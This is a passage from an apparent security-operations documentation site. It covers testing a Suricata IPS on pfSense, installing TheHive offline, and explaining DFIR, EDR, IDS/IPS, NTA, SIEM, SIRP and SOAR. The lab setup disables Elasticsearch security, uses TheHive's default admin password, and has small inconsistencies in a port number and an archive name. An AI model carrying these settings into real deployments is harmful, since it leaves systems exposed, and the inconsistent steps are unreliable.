Verify that alerts have not been generated.</p> <p></p> <p>Navigate to Interface Settings &gt; LAN Rules. Select emerging-dns.rules.</p> <p></p> <p>Search for <code>.to</code> . Verify that ET DNS Query for .to TLD is Auto-disabled by settings on SID Mgmt tab.</p> <p></p>"},{"location":"suricata/suricata.html#testing-ips","title":"Testing IPS","text":"<p>Disable Hardware Checksum Offloading. Navigate to System &gt; Advanced &gt; Networking.</p> <p>Select Disable hardware checksum offload and save. pfSense will reboot to apply changes.</p> <p></p> <p>Navigate to Suricata &gt; LAN Interface settings</p> <p>In the Alert and Block Settings, select Block Offenders and Inline mode for IPS mode.</p> <p></p> <p>Navigate to SID Mgmt and edit LAN-Drops. Copy and paste the following list:</p> <pre><code>emerging-3coresec\nemerging-ciarmy\nemerging-compromised\nemerging-current_events\nemerging-drop\nemerging-dshield\nemerging-dns\nemerging-botcc\nemerging-malware\nemerging-tor\nemerging-trojan\nemerging-scan\nfeodotracker\nsslblacklist_tls_cert\n</code></pre> <p></p> <p>For Interface SID Management List Assignments, select Rebuild and select LAN-Drops for Drop SID LIst. Click Save.</p> <p></p> <p>Navigate to Interface tab and restart Suricata</p> <p></p> <p>On Windows host, browse through <code>http://malware.wicar.org/</code>: This site hosts files and URLs that trigger IPS/IDS signatures without actually hosting real malware.</p> <p>Verify that the alerts have been generated.</p> <p></p> <p>Part of our LAN-Drops includes a rule that will drop a traffic when a user visits <code>.cc</code> TLD</p> <p>From Windows host, run <code>nslookup something.cc</code> </p> <pre><code>PS C:\\Users\\Administrator\\Downloads&gt; nslookup something.cc\nServer:  UnKnown\nAddress:  ::1\n\nDNS request timed out.\n    timeout was 2 seconds.\nDNS request timed out.\n    timeout was 2 seconds.\n*** Request to UnKnown timed-out\n</code></pre> <p>Alerts log shows that DNS query to .cc TLD has been dropped</p> <p></p>"},{"location":"suricata/suricata.html#references","title":"References","text":"<ul> <li>https://docs.suricata.io/en/latest/index.html</li> <li>https://documentation.wazuh.com/current/proof-of-concept-guide/integrate-network-ids-suricata.html</li> <li>https://youtu.be/UXKbh0jPPpg?si=9_Ry4dN7_X7HHpvH</li> <li>https://github.com/nn-df/suricata-installation-ips-mode</li> <li>https://tools.emergingthreats.net/docs/ETPro Rule Categories.pdf</li> </ul>"},{"location":"thehive/thehive.html","title":"TheHive","text":"<p>TheHive is an open-source security incident response platform designed to help organisations efficiently manage and respond to cybersecurity incidents. Developed to facilitate collaboration among security teams, it provides a centralised system for tracking and investigating security events, alerts, and cases.</p>"},{"location":"thehive/thehive.html#lab-setup-for-proof-of-concept","title":"Lab Setup for Proof of Concept","text":"<p>In this proof of concept, TheHive was installed on an Ubuntu Virtual Machine (VM). </p> Host OS Role IP Address Fortigate Fortios 7.6.0 Firewall/Router 192.168.1.111 (WAN) / 10.0.0.1 (LAN) hive Ubuntu 22.04 LTS TheHive VM 10.0.0.40 <p></p>"},{"location":"thehive/thehive.html#install-thehive-offline","title":"Install TheHive Offline","text":""},{"location":"thehive/thehive.html#download-the-dependencies","title":"Download the dependencies","text":"<p>On an internet-connected Ubuntu machine, make a folder called the hive-package</p> <pre><code>mkdir hive-package\ncd hive-package\n</code></pre> <p>Download openjdk 11</p> <pre><code>#wget http://archive.ubuntu.com/ubuntu/pool/main/o/openjdk-lts/openjdk-11-jdk_11.0.24+8-1ubuntu3~22.04_amd64.deb\n</code></pre> <p>Add the Cassandra, StrangeBee and Elasticsearch repositories and its GPG keys:</p> <pre><code>wget -qO - https://downloads.apache.org/cassandra/KEYS | sudo gpg --dearmor  -o /usr/share/keyrings/cassandra-archive.gpg\necho \"deb [signed-by=/usr/share/keyrings/cassandra-archive.gpg] https://debian.cassandra.apache.org 40x main\" | sudo tee -a /etc/apt/sources.list.d/cassandra.sources.list\nwget -O- https://archives.strangebee.com/keys/strangebee.gpg | sudo gpg --dearmor -o /usr/share/keyrings/strangebee-archive-keyring.gpg\necho 'deb [signed-by=/usr/share/keyrings/strangebee-archive-keyring.gpg] https://deb.strangebee.com thehive-5.2 main' | sudo tee -a /etc/apt/sources.list.d/strangebee.list\nwget -qO - https://artifacts.elastic.co/GPG-KEY-elasticsearch |  sudo gpg --dearmor -o /usr/share/keyrings/elasticsearch-keyring.gpg\nsudo apt-get install apt-transport-https\necho \"deb [signed-by=/usr/share/keyrings/elasticsearch-keyring.gpg] https://artifacts.elastic.co/packages/8.x/apt stable main\" |  sudo tee /etc/apt/sources.list.d/elastic-8.x.list\n</code></pre> <p>Update and download the required packages without installing: This will download all packages into the cache <code>/var/cache/apt/archives/</code></p> <pre><code>sudo apt update\nsudo apt-get install -y --download-only cassandra\nsudo apt-get install -y --download-only thehive\nsudo apt-get install -y --download-only elasticsearch\n</code></pre> <p>Run the following command to copy the required files and dependencies to the <code>hive-package</code> </p> <pre><code>cd /var/cache/apt/archives\ncp openjdk-11-jre-headless_11.0.24+8-1ubuntu3~22.04_amd64.deb cassandra_4.0.13_all.deb java-common_0.72build2_all.deb ca-certificates-java_20190909ubuntu1.2_all.deb thehive_5.2.14-1_all.deb elasticsearch_8.15.1_amd64.deb ~/hive-package/\n</code></pre> <p>Compress the hive-package directory</p> <pre><code>cd ..\ntar -czvf hive-package.tar.gz hive-package\n</code></pre> <p>Transfer and extract the hive-package on the air-gapped machine</p> <p>Install the deb packages</p> <pre><code>tar -xzvf thehive_packages.tar.gz\nsudo dpkg -i *\n</code></pre>"},{"location":"thehive/thehive.html#configure-thehive","title":"Configure TheHive","text":"<p>Edit /etc/cassandra/cassandra.yaml</p> <p>Leave cluster names as \u2018Test Cluster\u2019</p> <p>Change the listen_address, rpc_address and the seeds to your IP address</p> <pre><code>cluster_name: 'Test Cluster'\n...\nlisten_address: 10.0.0.40\n...\nrpc_address: 10.0.0.40\n...\nseed_provider:\n    # Addresses of hosts that are deemed contact points. \n    # Cassandra nodes use this list of hosts to find each other and learn\n    # the topology of the ring.  You must change this if you are running\n    # multiple nodes!\n    - class_name: org.apache.cassandra.locator.SimpleSeedProvider\n      parameters:\n          # seeds is actually a comma-delimited list of addresses.\n          # Ex: \"&lt;ip1&gt;,&lt;ip2&gt;,&lt;ip3&gt;\"\n          - seeds: \"10.0.0.40:7000\"\n</code></pre> <p>Stop cassandra, remove the system keyspace data and then start cassandra. \\</p> <p>Verify that cassandra service is active and running.</p> <pre><code>systemctl stop cassandra\nrm -rf /var/lib/cassandra/data/system/*\nsystemctl start cassandra.service\nsystemctl status cassandra.service\n</code></pre> <p>Edit /etc/elasticsearch/elasticsearch.yml</p> <p>Uncomment the cluster name and change it to thehive</p> <p>Uncomment the node name and leave it as node-1</p> <p>Uncomment the network host and change it to your IP address</p> <p>Uncomment the http port: 92000</p> <p>Uncomment the cluster initial master nodes and remove node-2</p> <p>Comment the cluster initial master nodes \u201chive\u201d</p> <pre><code>cluster.name: thehive\n...\nnode.name: node-1\n...\nnetwork.host: 10.0.0.40\n...\nhttp.port: 9200\n...\ncluster.initial_master_nodes: [\"node-1\"]\n...\n# Enable security features\nxpack.security.enabled: false\nxpack.security.enrollment.enabled: false\n...\n#cluster.initial_master_nodes: [\"hive\"]\n</code></pre> <p>Start and enable elasticsearch. Verify elasticsearch service is active and running.</p> <pre><code>systemctl start elasticsearch\nsystemctl enable elasticsearch\nsystemctl status elasticsearch.service\n</code></pre> <p>Change the ownership of the /opt/thp directory to thehive user and group.</p> <p>Verify the ownership</p> <pre><code>chown -R thehive:thehive /opt/thp\n\nls -la /opt/thp\ntotal 12\ndrwxr-xr-x 3 thehive thehive 4096 Sep  7 17:12 .\ndrwxr-xr-x 4 root    root    4096 Sep  7 17:12 ..\ndrwxr-xr-x 5 thehive thehive 4096 Sep  7 17:12 thehive\n</code></pre> <p>Edit /etc/thehive/application.conf</p> <p>Change the host name and application baseURL to your IP address</p> <p>Make sure cluster-name matches with the cluster name defined in cassandra.yaml</p> <p>To ensure TheHive is listening on the correct IP address and port, add the following lines under the service configuration:</p> <pre><code>db.janusgraph {\n  storage {\n    backend = cql\n    hostname = [\"10.0.0.40\"]\n    # Cassandra authentication (if configured)\n    # username = \"thehive\"\n    # password = \"password\"\n    cql {\n      cluster-name = \"Test Cluster\"\n      keyspace = thehive\n    }\n  }\n  index.search {\n    backend = elasticsearch\n    hostname = [\"10.0.0.40\"]\n    index-name = thehive\n  }\n}\n...\n# Service configuration\napplication.baseUrl = \"http://10.0.0.40:9000\"\nplay.http.context = \"/\"\nplay {\n  http {\n    address = \"0.0.0.0\"  # Listen on all interfaces or set to \"10.0.0.40\" to bind to that IP\n    port = 9000\n  }\n}\n</code></pre> <p>Start and enable thehive service. Verify it is active and running.</p> <pre><code>systemctl start thehive\nsystemctl enable thehive\nsystemctl status thehive\n</code></pre> <p>Navigate to thehive dashboard http://10.0.0.40:9000</p> <p>Login using default credentials admin@hive.local (password: secret)</p> <p></p>"},{"location":"thehive/thehive.html#references","title":"References","text":"<ul> <li>https://github.com/MyDFIR/SOC-Automation-Project/blob/main/TheHive-Install-Instructions</li> <li>https://youtu.be/YxpUx0czgx4?si=-B57fRikVW8AVORo</li> <li>https://youtu.be/VuSKMPRXN1M?si=JctwPim-_c3ydR-E</li> </ul>"},{"location":"understanding-DFIR/understanding-DFIR.html","title":"Understanding DFIR","text":""},{"location":"understanding-DFIR/understanding-DFIR.html#what-is-dfir","title":"What is DFIR?","text":"<p>Digital Forensics and Incident Response (DFIR) refers to the combined processes of gathering and analysing digital evidence to detect, investigate, and respond to cyber incidents.</p> <ul> <li>Digital Forensics: The process of identifying, collecting, preserving, and analysing evidence from digital devices.</li> <li>Incident Response: The structured approach to managing the aftermath of a security breach or attack, with the goal of limiting damage and reducing recovery time and costs.</li> </ul>"},{"location":"understanding-DFIR/understanding-DFIR.html#why-dfir-matters-to-us","title":"Why DFIR Matters to Us","text":"<ol> <li>Rapid Detection and Response<ul> <li>Early Threat Detection: Identifies potential threats before they can escalate into significant incidents.</li> <li>Efficient Incident Handling: Enables swift and structured response to mitigate damage.</li> </ul> </li> <li>Evidence Collection and Preservation<ul> <li>Forensic Analysis: Collects detailed evidence, ensuring it can be used to understand incidents or support legal investigations.</li> <li>Compliance: Helps meet regulatory requirements for incident reporting and evidence preservation.</li> </ul> </li> <li>Minimising Impact<ul> <li>Damage Control: Ensures that the impact of any incident is limited by taking rapid response measures.</li> <li>Recovery and Learning: Facilitates prompt system recovery and helps learn from incidents to improve defenses.</li> </ul> </li> <li>Improved Visibility and Monitoring<ul> <li>Comprehensive Analysis: Provides deep insights into endpoints and activities, ensuring comprehensive monitoring and forensic analysis.</li> </ul> </li> </ol>"},{"location":"understanding-DFIR/understanding-DFIR.html#benefits-of-implementing-dfir","title":"Benefits of Implementing DFIR","text":"<ul> <li>Proactive Threat Management: Identifies and responds to potential threats before they become major incidents.</li> <li>Streamlined Investigations: Enables effective evidence collection and forensic analysis.</li> <li>Operational Continuity: Minimises downtime by responding rapidly to incidents.</li> <li>Compliance Support: Ensures regulatory requirements for incident management and digital evidence are met.</li> <li>Cost Efficiency: Reduces the costs associated with long recovery times and system outages.</li> </ul>"},{"location":"understanding-DFIR/understanding-DFIR.html#dfir-solution","title":"DFIR Solution","text":""},{"location":"understanding-DFIR/understanding-DFIR.html#velociraptor","title":"Velociraptor","text":"<ul> <li>Endpoint Visibility and Control: Velociraptor provides deep visibility into endpoints, allowing us to hunt for indicators of compromise (IoCs) across the network.</li> <li>Flexible Querying: Utilises Velociraptor Query Language (VQL) to perform detailed investigations on endpoint activity.</li> <li>Rapid Data Collection: Gathers information quickly from multiple endpoints for analysis.</li> <li>Scalable and Extensible: Designed to scale across large environments, with community-contributed plugins and scripts to enhance capabilities.</li> </ul>"},{"location":"understanding-DFIR/understanding-DFIR.html#how-dfir-works","title":"How DFIR Works","text":"<ol> <li>Detection<ul> <li>Monitoring and Alerts: Detects suspicious activities and alerts the response team.</li> </ul> </li> <li>Investigation<ul> <li>Data Collection: Collects data from endpoints using Velociraptor or GRR for forensic analysis.</li> <li>Analysis: analyses the collected data to identify the root cause and understand the scope of the incident.</li> </ul> </li> <li>Containment and Eradication<ul> <li>Containment Measures: Limits the spread of an incident by isolating affected systems.</li> <li>Eradication: Removes the malicious artifacts from systems to prevent recurrence.</li> </ul> </li> <li>Recovery<ul> <li>Restoration: Restores systems to normal operation, ensuring no remnants of the threat remain.</li> </ul> </li> <li>Lessons Learned<ul> <li>Review: analyses what went wrong, what worked, and what can be improved in the incident response process.</li> </ul> </li> </ol>"},{"location":"understanding-EDR/understanding-EDR.html","title":"Understanding EDR","text":""},{"location":"understanding-EDR/understanding-EDR.html#what-is-edr","title":"What is EDR?","text":"<p>Endpoint Detection and Response (EDR) is a cybersecurity technology that focuses on identifying, investigating, and responding to threats targeting endpoint devices such as laptops, desktops, and servers. EDR systems continuously monitor endpoint activity, detect suspicious behaviour, and provide tools for analysing and mitigating potential threats, ensuring endpoint devices remain secure.</p>"},{"location":"understanding-EDR/understanding-EDR.html#why-edr-matters-to-us","title":"Why EDR Matters to Us","text":"<ol> <li>Proactive Threat Detection<ul> <li>Advanced Visibility: Monitors endpoint activity to detect potential threats and vulnerabilities.</li> <li>Behavioural Analysis: Identifies patterns of malicious behaviour that may evade traditional antivirus solutions.</li> </ul> </li> <li>Incident Response<ul> <li>Quick Containment: EDR enables the isolation of compromised endpoints to prevent further spread.</li> <li>In-Depth Investigation: Offers detailed tools for understanding the scope and root cause of incidents.</li> </ul> </li> <li>Enhanced Endpoint Security<ul> <li>Zero-Day Protection: Detects and blocks threats from unknown vulnerabilities through behaviour-based analysis.</li> <li>Continuous Monitoring: Provides real-time protection against evolving threats.</li> </ul> </li> </ol>"},{"location":"understanding-EDR/understanding-EDR.html#benefits-of-implementing-edr","title":"Benefits of Implementing EDR","text":"<ul> <li>Rapid Response: Neutralises threats quickly to minimise impact.</li> <li>Comprehensive Visibility: Provides a clear understanding of endpoint activities.</li> <li>Reduced Downtime: Minimises operational disruptions caused by incidents.</li> <li>Improved Resilience: Enhances the ability to prevent, detect, and recover from cyberattacks.</li> </ul>"},{"location":"understanding-EDR/understanding-EDR.html#how-edr-works","title":"How EDR Works","text":"<ol> <li>Data Collection: Gathers and stores activity data from endpoint devices, including processes, files, and network connections.</li> <li>Threat Detection: Uses AI, machine learning, and behavioural analytics to identify potential security threats in real time.</li> <li>Investigation: Provides forensic tools to analyse the nature, scope, and impact of detected incidents.</li> <li>Response: Enables automated and manual actions, such as isolating endpoints, terminating malicious processes, and restoring affected systems.</li> </ol>"},{"location":"understanding-EDR/understanding-EDR.html#edr-solution","title":"EDR Solution","text":"<ul> <li>Aurora Lite is an efficient and lightweight EDR solution tailored to provide robust protection for endpoint devices without overwhelming system resources. Its key features include:<ul> <li>Sigma Rules Integration: Detects threats by applying Sigma rules, a widely recognised standard for creating and sharing detection rules.</li> <li>Customisable Signatures and IOCs: Allows flexibility to adapt detection capabilities to meet specific security needs.</li> <li>Automated Response: Includes preconfigured actions to immediately contain and mitigate threats.</li> <li>Ease of Deployment: Simplifies the installation process for fast implementation across endpoints.</li> <li>Low Resource Usage: Optimised to run efficiently without impacting device performance.</li> </ul> </li> </ul>"},{"location":"understanding-IDS-IPS/understanding-IDS-IPS.html","title":"Understanding IDS/IPS","text":""},{"location":"understanding-IDS-IPS/understanding-IDS-IPS.html#what-are-ids-and-ips","title":"What are IDS and IPS?","text":"<p>Intrusion Detection Systems (IDS) and Intrusion Prevention Systems (IPS) are cybersecurity technologies designed to monitor network traffic for signs of malicious activity.</p> <ul> <li>IDS: Monitors network traffic and alerts security teams when suspicious activities are detected.</li> <li>IPS: Not only detects suspicious activities but also takes action to prevent potential threats from causing harm.</li> </ul>"},{"location":"understanding-IDS-IPS/understanding-IDS-IPS.html#why-idsips-matter-to-us","title":"Why IDS/IPS Matter to Us","text":"<ol> <li>Proactive Threat Detection<ul> <li>Early Warning: IDS alerts us to potential security threats before they become serious issues.</li> <li>Immediate Action: IPS can block malicious traffic in real-time, preventing attacks.</li> </ul> </li> <li>Real-Time Monitoring<ul> <li>Continuous Surveillance: Keeps an eye on network activity around the clock.</li> <li>Swift Response: Enables quick action to mitigate threats as they arise.</li> </ul> </li> <li>Regulatory Compliance<ul> <li>Meeting Standards: Helps us comply with cybersecurity regulations and industry best practices.</li> <li>Audit Trails: Provides detailed logs required for compliance reporting.</li> </ul> </li> <li>Risk Mitigation<ul> <li>Reducing Breaches: Helps prevent security incidents that could harm our operations and reputation.</li> <li>Strategic Planning: Informs decisions on improving our cybersecurity measures.</li> </ul> </li> </ol>"},{"location":"understanding-IDS-IPS/understanding-IDS-IPS.html#benefits-of-implementing-idsips","title":"Benefits of Implementing IDS/IPS","text":"<ul> <li>Enhanced Security: Strengthens our defenses against cyber attacks.</li> <li>Operational Efficiency: Automates threat detection and prevention, reducing manual efforts.</li> <li>Stakeholder Confidence: Shows our commitment to security, building trust with clients and partners.</li> <li>Cost Savings: Prevents costly security breaches and downtime.</li> </ul>"},{"location":"understanding-IDS-IPS/understanding-IDS-IPS.html#how-idsips-work","title":"How IDS/IPS Work","text":"<ol> <li>Traffic Monitoring: Continuously scans network traffic for unusual patterns or known threat signatures.</li> <li>Analysis: Uses rules and algorithms to detect potential threats based on predefined criteria.</li> <li>Alerting (IDS): Sends notifications to the security team when suspicious activity is detected.</li> <li>Prevention (IPS): Automatically blocks or quarantines malicious traffic to prevent damage.</li> </ol>"},{"location":"understanding-IDS-IPS/understanding-IDS-IPS.html#idsips-solutions","title":"IDS/IPS Solutions","text":"<ul> <li>Snort<ul> <li>Open-Source IDS/IPS: Widely used for real-time traffic analysis and packet logging.</li> <li>Customisation: Allows us to tailor rules to our specific network environment.</li> <li>Community Support: Extensive community and a large repository of rules for threat detection.</li> </ul> </li> <li>Suricata<ul> <li>Open-Source IDS/IPS: Provides robust intrusion detection and prevention capabilities.</li> <li>Protocol Detection: Automatically detects and parses various protocols such as HTTP for deeper inspection.</li> <li>Integration Capabilities: Easily integrates with other security tools and platforms, enhancing overall security infrastructure.</li> </ul> </li> </ul>"},{"location":"understanding-NTA/understanding-NTA.html","title":"Understanding NTA","text":""},{"location":"understanding-NTA/understanding-NTA.html#what-is-nta","title":"What is NTA?","text":"<p>Network Traffic Analysis (NTA) involves examining network traffic patterns to detect anomalies, understand usage, and identify potential threats. A Network Traffic Analyser is a tool that monitors, captures, and analyses network data to provide insights into network performance and security.</p>"},{"location":"understanding-NTA/understanding-NTA.html#why-nta-matters-to-us","title":"Why NTA Matters to Us","text":"<ol> <li>Enhanced Visibility<ul> <li>Comprehensive Monitoring: Provides a detailed view of all activities on our network.</li> <li>Anomaly Detection: Identifies unusual patterns that may indicate security threats or performance issues.</li> </ul> </li> <li>Improved Security<ul> <li>Threat Detection: Helps in identifying malicious activities such as malware, unauthorised access, or data exfiltration.</li> <li>Incident Response: Aids in investigating and responding to security incidents promptly.</li> </ul> </li> <li>Performance Optimisation<ul> <li>Resource Management: Monitors bandwidth usage to optimise network performance.</li> <li>Troubleshooting: Assists in quickly identifying and resolving network issues affecting productivity.</li> </ul> </li> <li>Regulatory Compliance<ul> <li>Audit Trails: Maintains detailed logs required for compliance with industry regulations.</li> <li>Policy Enforcement: Ensures adherence to organisational network usage policies.</li> </ul> </li> </ol>"},{"location":"understanding-NTA/understanding-NTA.html#benefits-of-implementing-nta","title":"Benefits of Implementing NTA","text":"<ul> <li>Proactive Threat Management: Early detection of security threats before they escalate.</li> <li>Operational Efficiency: Reduces downtime by swiftly addressing network issues.</li> <li>Cost Savings: Optimises resource utilisation, reducing unnecessary expenses.</li> <li>Informed Decision-Making: Provides data-driven insights for strategic planning and policy development.</li> <li>Stakeholder Confidence: Demonstrates our commitment to maintaining a secure and efficient network environment.</li> </ul>"},{"location":"understanding-NTA/understanding-NTA.html#how-nta-works","title":"How NTA Works","text":"<ol> <li>Data Capture<ul> <li>Continuously collects network packets and flow data in real-time.</li> </ul> </li> <li>Data Processing<ul> <li>Analyses the captured data to identify patterns, anomalies, and trends.</li> </ul> </li> <li>Alerting and Reporting<ul> <li>Generates alerts for suspicious activities and comprehensive reports on network performance.</li> </ul> </li> <li>Actionable Insights<ul> <li>Provides recommendations for enhancing network security and efficiency.</li> </ul> </li> </ol>"},{"location":"understanding-NTA/understanding-NTA.html#nta-solutions","title":"NTA Solutions","text":""},{"location":"understanding-NTA/understanding-NTA.html#wireshark","title":"Wireshark","text":"<ul> <li>Comprehensive Network Protocol Analyser: Wireshark is a widely-used open-source tool for network troubleshooting, analysis, and education.</li> <li>Deep Inspection: Captures live network traffic and allows detailed examination of hundreds of protocols.</li> <li>User-Friendly Interface: Provides a graphical interface with powerful filtering capabilities for easy analysis.</li> <li>Cross-Platform Support: Available on multiple operating systems including Windows, macOS, and Linux.</li> <li>Educational Resource: Great for learning about network protocols and how data traverses the network.</li> </ul> <p>Note: Wireshark proof of concept and documentation will be released later. We will provide more information on this tool once it is available.</p>"},{"location":"understanding-NTA/understanding-NTA.html#zeek","title":"Zeek","text":"<ul> <li>Powerful Network Analysis Framework: Zeek (formerly known as Bro) is an open-source platform that offers deep network traffic analysis.</li> <li>Security Monitoring: Detects a wide range of malicious activities by analysing network protocols and behaviours.</li> <li>Flexibility and Extensibility: Features a powerful scripting language for custom policy creation and event handling.</li> <li>Integration Capabilities: Easily integrates with other security tools, enhancing our overall cybersecurity infrastructure.</li> <li>Community Support: Backed by an active community contributing scripts, plugins, and support.</li> </ul>"},{"location":"understanding-NTA/understanding-NTA.html#zui","title":"Zui","text":"<ul> <li>Enhanced PCAP Viewer: Zui is a modern network analysis tool designed to simplify the analysis of pcap files and Zeek logs.</li> <li>Improved Readability: Offers a clear and intuitive interface that makes complex network data more accessible.</li> <li>Fast Search Capabilities: Allows quick searching through large datasets, facilitating efficient investigation of network events.</li> <li>Collaborative Analysis: Supports workflows where multiple users can analyse the same network data, promoting teamwork in incident response and forensic analysis.</li> <li>Seamless Integration: Works effectively with both Zeek and Wireshark, complementing their deep network inspection capabilities with user-friendly data presentation.</li> </ul>"},{"location":"understanding-SIEM/understanding-SIEM.html","title":"Understanding SIEM","text":""},{"location":"understanding-SIEM/understanding-SIEM.html#what-is-siem","title":"What is SIEM?","text":"<p>Security Information and Event Management (SIEM) is a technology that provides real-time analysis of security alerts generated by applications and network hardware. SIEM systems collect and analyse security events from various sources within the IT infrastructure to detect anomalies, threats, and compliance issues, giving a centralised view of the organisation's security posture.</p>"},{"location":"understanding-SIEM/understanding-SIEM.html#why-siem-matters-to-us","title":"Why SIEM Matters to Us","text":"<ol> <li>Proactive Threat Detection<ul> <li>Early Identification: SIEM enables us to detect potential security incidents before they escalate.</li> <li>Real-Time Monitoring: Continuous surveillance helps us respond swiftly to threats.</li> </ul> </li> <li>Regulatory Compliance<ul> <li>Meeting Standards: SIEM assists in complying with military cybersecurity standards and other regulations.</li> <li>Audit Trails: Maintains comprehensive logs necessary for audits and compliance reporting.</li> </ul> </li> <li>Risk Mitigation<ul> <li>Reducing Breaches: Consolidated security events help prevent breaches that could harm operations and reputation.</li> <li>Strategic Decision-Making: Provides insights to inform cybersecurity investments and policies.</li> </ul> </li> </ol>"},{"location":"understanding-SIEM/understanding-SIEM.html#benefits-of-implementing-siem","title":"Benefits of Implementing SIEM","text":"<ul> <li>Enhanced Security: Strengthens defenses against sophisticated cyber threats.</li> <li>Operational Efficiency: Automates security monitoring, reducing manual efforts.</li> <li>Stakeholder Confidence: Demonstrates a commitment to security, bolstering trust.</li> <li>Cost Savings: Prevents costly breaches and downtime, safeguarding financial resources.</li> </ul>"},{"location":"understanding-SIEM/understanding-SIEM.html#how-siem-works","title":"How SIEM Works","text":"<ol> <li>Data Collection: Aggregates logs and events from servers, network devices, applications, and security tools.</li> <li>Normalisation: Converts data into a consistent format for easier analysis.</li> <li>Correlation: Uses rules and algorithms to link related events and identify patterns indicative of security incidents.</li> <li>Alerting and Reporting: Generates real-time alerts and comprehensive reports for security teams.</li> </ol>"},{"location":"understanding-SIEM/understanding-SIEM.html#siem-solutions","title":"SIEM Solutions","text":"<ul> <li>Splunk<ul> <li>Data Analytics Platform: excels at indexing, searching, and analysng large volumes of machine-generated data.</li> <li>Real-Time Monitoring: Provides live dashboards and visualizations for immediate insight.</li> <li>Extensibility: Supports a wide range of data inputs and third-party integrations.</li> </ul> </li> <li>Wazuh<ul> <li>Open-Source SIEM and XDR: SIEM and XDR (Extended Detection and Response) offers unified security monitoring and endpoint detection capabilities.</li> <li>Agent-Based Architecture: Deploys agents on endpoints for detailed data collection and active response.</li> <li>Compliance Management: Includes built-in checks for regulatory standards.</li> </ul> </li> </ul>"},{"location":"understanding-SIRP/understanding-SIRP.html","title":"Understanding SIRP","text":""},{"location":"understanding-SIRP/understanding-SIRP.html#what-is-a-sirp","title":"What is a SIRP?","text":"<p>A Security Incident Response Platform is an integrated suite of tools designed to streamline and automate the process of managing cybersecurity incidents from detection to resolution.</p> <ul> <li>Incident Management: Facilitates the identification, containment, eradication, and recovery from security incidents.</li> <li>Case Management: Offers a structured framework for documenting, tracking, and managing incidents and investigations.</li> <li>Automation and Orchestration: Automates routine tasks and orchestrates workflows across different security tools.</li> </ul> <p>By consolidating these functionalities, a SIRP enhances the efficiency of incident response, improves team collaboration, and ensures that incidents are handled in a consistent and effective manner.</p>"},{"location":"understanding-SIRP/understanding-SIRP.html#why-sirp-matters-to-us","title":"Why SIRP Matters to Us","text":"<p>Efficient Incident Handling</p> <ul> <li>Systematic Approach: Provides a coordinated and methodical response to security incidents, reducing confusion and delays.</li> <li>Resource Optimisation: Helps prioritise incidents based on severity, ensuring that critical issues receive immediate attention.</li> </ul> <p>Enhanced Collaboration</p> <ul> <li>Team Coordination: Improves communication among IT, security teams, and other stakeholders involved in incident resolution.</li> <li>Centralised Information: Stores all incident-related data in one place, making it easier for teams to access and contribute relevant information.</li> </ul> <p>Regulatory Compliance</p> <ul> <li>Comprehensive Audit Trails: Maintains detailed records of incident handling, essential for compliance with cybersecurity regulations and standards.</li> <li>Policy Enforcement: Ensures that incident response procedures adhere to organisational policies and legal requirements.</li> </ul> <p>Risk Mitigation</p> <ul> <li>Minimising Impact: Enables swift and effective responses, reducing the potential damage from security incidents.</li> <li>Continuous Improvement: Analyses incidents to inform future security strategies and enhance incident response plans.</li> </ul> <p></p>"},{"location":"understanding-SIRP/understanding-SIRP.html#benefits-of-implementing-a-sirp","title":"Benefits of Implementing a SIRP","text":"<ul> <li>Improved Response Times: Automates repetitive tasks, allowing teams to focus on critical analysis and decision-making.</li> <li>Consistency: Standardises incident handling procedures across the organisation.</li> <li>Greater Visibility: Provides real-time insights into the status of incidents and the effectiveness of response efforts.</li> <li>Stakeholder Confidence: Demonstrates our commitment to robust security practices, enhancing trust with clients, partners, and regulators.</li> <li>Cost Efficiency: Reduces the financial impact of security incidents through quicker containment and recovery.</li> </ul>"},{"location":"understanding-SIRP/understanding-SIRP.html#how-a-sirp-works","title":"How a SIRP Works","text":"<ol> <li>Detection and Alerting: Integrates with security systems to receive alerts about potential security incidents.</li> <li>Incident Logging: Automatically creates a case for each incident, capturing all relevant details.</li> <li>Assessment and Prioritisation: Evaluates the severity and impact of the incident to prioritise response efforts.</li> <li>Response Coordination: Assigns tasks to team members, sets deadlines, and facilitates communication.</li> <li>Automation and Orchestration: Automates routine actions and coordinates workflows across various security tools.</li> <li>Documentation: Records all actions taken, decisions made, and evidence collected during the incident response.</li> <li>Resolution and Closure: Concludes the case once the incident is resolved, ensuring all loose ends are tied up.</li> <li>Reporting and Analysis: Generates reports for internal review and compliance purposes, and analyses incidents to improve future responses.</li> </ol>"},{"location":"understanding-SIRP/understanding-SIRP.html#sirp-solutions","title":"SIRP Solutions","text":"<p>TheHive</p> <ul> <li>Scalable Case Management: An open-source SIRP that enables efficient handling of multiple security incidents.</li> <li>Collaboration Features: Enhances teamwork through shared dashboards and real-time updates.</li> <li>Integration Capabilities: Easily connects with other security tools to provide a unified incident response ecosystem.</li> </ul> <p>IRIS</p> <ul> <li>Open-Source Platform: A robust SIRP designed for managing and automating incident response processes.</li> <li>Comprehensive Case Management: Offers modules for case tracking, evidence management, and detailed reporting.</li> <li>Customisable Workflows: Allows tailoring of incident response procedures to fit organisational needs.</li> </ul> <p></p>"},{"location":"understanding-SOAR/understanding-SOAR.html","title":"Understanding SOAR","text":""},{"location":"understanding-SOAR/understanding-SOAR.html#what-is-soar","title":"What is SOAR?","text":"<p>Security Orchestration, Automation, and Response (SOAR) is a set of technologies that enable organisations to collect security threat data and alerts from multiple sources. SOAR solutions allow for the automation of responses to low-level threats and the orchestration of complex processes involving multiple tools and teams.</p> <ul> <li>Security Orchestration: Integrates different security tools and systems to work together seamlessly.</li> <li>Automation: Automates routine and repetitive security tasks to improve efficiency.</li> <li>Response: Facilitates swift and effective responses to security incidents.</li> </ul>"},{"location":"understanding-SOAR/understanding-SOAR.html#why-soar-matters-to-us","title":"Why SOAR Matters to Us","text":"<ol> <li>Efficiency and Productivity<ul> <li>Reduced Manual Work: Automates repetitive tasks, freeing up our security team to focus on more critical issues.</li> <li>Faster Response Times: Automates incident responses to mitigate threats more quickly.</li> </ul> </li> <li>Enhanced Threat Management<ul> <li>Improved Detection: Correlates data from various sources for better threat detection.</li> <li>Comprehensive Response: Coordinates actions across different security tools for effective threat mitigation.</li> </ul> </li> <li>Scalability<ul> <li>Handling Alert Fatigue: Manages the growing number of security alerts without overburdening the team.</li> <li>Adaptability: Scales with our organisation's growth and evolving security needs.</li> </ul> </li> <li>Regulatory Compliance<ul> <li>Consistent Processes: Ensures compliance through standardized and documented response procedures.</li> <li>Audit Readiness: Maintains logs and reports necessary for audits and compliance checks.</li> </ul> </li> </ol>"},{"location":"understanding-SOAR/understanding-SOAR.html#benefits-of-implementing-soar","title":"Benefits of Implementing SOAR","text":"<ul> 